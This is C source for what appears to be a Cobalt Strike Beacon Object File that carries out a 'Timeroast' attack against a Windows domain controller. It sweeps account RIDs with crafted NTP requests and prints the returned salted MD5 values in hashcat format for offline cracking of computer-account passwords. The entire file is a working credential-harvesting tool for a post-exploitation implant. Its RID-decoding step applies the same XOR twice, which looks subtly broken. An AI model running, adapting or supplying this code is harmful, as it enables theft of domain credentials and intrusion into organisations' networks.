#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>
#include "beacon.h"

#define NTP_PREFIX_LEN  48
#define PACKET_LEN      68
#define DEFAULT_RATE    180
#define DEFAULT_TIMEOUT 24
#define MAX_RID         2147483647

DECLSPEC_IMPORT SOCKET WINAPI WS2_32$socket(int af, int type, int protocol);
DECLSPEC_IMPORT int WINAPI WS2_32$bind(SOCKET s, const struct sockaddr *addr, int addrlen);
DECLSPEC_IMPORT int WINAPI WS2_32$setsockopt(SOCKET s, int level, int optname, const char *optval, int optlen);
DECLSPEC_IMPORT int WINAPI WS2_32$sendto(SOCKET s, const char *buf, int len, int flags, const struct sockaddr *to, int tolen);
DECLSPEC_IMPORT int WINAPI WS2_32$recvfrom(SOCKET s, char *buf, int len, int flags, struct sockaddr *from, int *fromlen);
DECLSPEC_IMPORT int WINAPI WS2_32$closesocket(SOCKET s);
DECLSPEC_IMPORT u_short WINAPI WS2_32$htons(u_short hostshort);
DECLSPEC_IMPORT int WINAPI WS2_32$WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
DECLSPEC_IMPORT int WINAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT int WINAPI WS2_32$WSAGetLastError(void);
DECLSPEC_IMPORT int WINAPI WS2_32$inet_pton(int Family, const char *pszAddrString, void *pAddrBuf);
WINBASEAPI int __cdecl MSVCRT$sprintf(char *__stream, const char *__format, ...);
WINBASEAPI void *__cdecl MSVCRT$memset(void *dest, int c, size_t count);
WINBASEAPI void *__cdecl MSVCRT$memcpy(void *dest, const void *src, size_t count);
WINBASEAPI time_t __cdecl MSVCRT$time(time_t *timer);

const uint8_t ntp_prefix[NTP_PREFIX_LEN] = 
{
    0xdb, 0x00, 0x11, 0xe9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x40, 0x7d, 0xeb, 0xc7, 0xe5, 0x06,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x42, 0x8b, 0xff, 0xbf, 0xcd, 0x0a
};

void HexEncode(const uint8_t *data, size_t len, char *output) 
{
    for (size_t i = 0; i < len; i++) {
        MSVCRT$sprintf(output + i * 2, "%02x", data[i]);
    }
}

int TimeRoast(char *dcAddr) 
{
    uint32_t minRID = 0;
    uint32_t maxRID = MAX_RID;
    int rate = DEFAULT_RATE;
    int timeout_sec = DEFAULT_TIMEOUT;
    uint16_t sourcePort = 0;

    WSADATA wsaData;
    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[X] WSAStartup failed: %d\n", WS2_32$WSAGetLastError());
        return 1;
    }

    SOCKET sockfd = WS2_32$socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd == INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Error creating socket: %d\n", WS2_32$WSAGetLastError());
        WS2_32$WSACleanup();
        return 1;
    }

    struct sockaddr_in target_addr;
    MSVCRT$memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = WS2_32$htons(123);

    if (WS2_32$inet_pton(AF_INET, dcAddr, &target_addr.sin_addr) != 1) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Invalid address: %s\n", dcAddr);
        WS2_32$closesocket(sockfd);
        WS2_32$WSACleanup();
        return 1;
    }

    if (sourcePort > 0) {
        struct sockaddr_in local_addr;
        MSVCRT$memset(&local_addr, 0, sizeof(local_addr));
        local_addr.sin_family = AF_INET;
        local_addr.sin_port = WS2_32$htons(sourcePort);
        local_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (WS2_32$bind(sockfd, (struct sockaddr*)&local_addr, sizeof(local_addr)) == SOCKET_ERROR) {
            BeaconPrintf(CALLBACK_ERROR, "[X] Error binding: %d\n", WS2_32$WSAGetLastError());
            WS2_32$closesocket(sockfd);
            WS2_32$WSACleanup();
            return 1;
        }
    }

    // set receive timeout
    DWORD timeout_ms = 1000 / rate;
    if (timeout_ms == 0) timeout_ms = 1;
    if (WS2_32$setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms)) == SOCKET_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Error setting socket options: %d\n", WS2_32$WSAGetLastError());
        WS2_32$closesocket(sockfd);
        WS2_32$WSACleanup();
        return 1;
    }

    uint32_t current_rid = minRID;
    time_t last_response_time = MSVCRT$time(NULL);
    uint8_t packet[PACKET_LEN];
    uint8_t response[PACKET_LEN];
    int hashes_found = 0;

    MSVCRT$memcpy(packet, ntp_prefix, NTP_PREFIX_LEN);
    MSVCRT$memset(packet + NTP_PREFIX_LEN + 4, 0, 16);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Starting Timeroast against %s\n", dcAddr);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] RID range: %u to %u\n", minRID, maxRID);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Rate: %d queries/second\n", rate);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Timeout: %d seconds\n\n", timeout_sec);

    while (1) {
        time_t now = MSVCRT$time(NULL);
        if (now - last_response_time >= timeout_sec) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Timeout reached, stopping..\n");
            break;
        }

        if (current_rid <= maxRID) {
            MSVCRT$memcpy(packet + NTP_PREFIX_LEN, &current_rid, sizeof(current_rid));
            WS2_32$sendto(sockfd, packet, PACKET_LEN, 0,
                  (struct sockaddr*)&target_addr, sizeof(target_addr));
            current_rid++;
        }

        ssize_t recv_len = WS2_32$recvfrom(sockfd, response, sizeof(response), 0, NULL, NULL);
        
        if (recv_len == PACKET_LEN) {
            last_response_time = MSVCRT$time(NULL);
            
            uint8_t salt[48];
            uint8_t md5hash[16];
            uint8_t rid_bytes[4];
            
            MSVCRT$memcpy(salt, response, 48);
            MSVCRT$memcpy(rid_bytes, response + 48, 4);
            MSVCRT$memcpy(md5hash, response + 52, 16);

            rid_bytes[0] ^= 0xdb;
            rid_bytes[1] ^= 0x00;
            rid_bytes[2] ^= 0x11; 
            rid_bytes[3] ^= 0xe9;  

            // convert bytes to LE RID
            uint32_t rid_response = (uint32_t)rid_bytes[0] |
                                   ((uint32_t)rid_bytes[1] << 8) |
                                   ((uint32_t)rid_bytes[2] << 16) |
                                   ((uint32_t)rid_bytes[3] << 24);

            // XOR with the key flag (0xe91100db - little-endian version of the first 4 prefix bytes)
            uint32_t keyFlag = 0xe91100db;
            rid_response ^= keyFlag;

            char hex_salt[97] = {0};
            char hex_hash[33] = {0};
            HexEncode(salt, 48, hex_salt);
            HexEncode(md5hash, 16, hex_hash);
            
            // output hash in hashcat (-m 31300) format
            BeaconPrintf(CALLBACK_OUTPUT, "%u:$sntp-ms$%s$%s\n", rid_response, hex_hash, hex_salt);
            hashes_found++;
        } 
    }

    WS2_32$closesocket(sockfd);
    WS2_32$WSACleanup();
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Found %d hashes\n", hashes_found);
    return 0;
}

void go(char *args, int length) 
{
    datap parser;
    BeaconDataParse(&parser, args, length);
    char *dcAddr = BeaconDataExtract(&parser, NULL);

    if (!dcAddr) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: timeroast <DC IP>\n");
        return;
    }

    TimeRoast(dcAddr);
}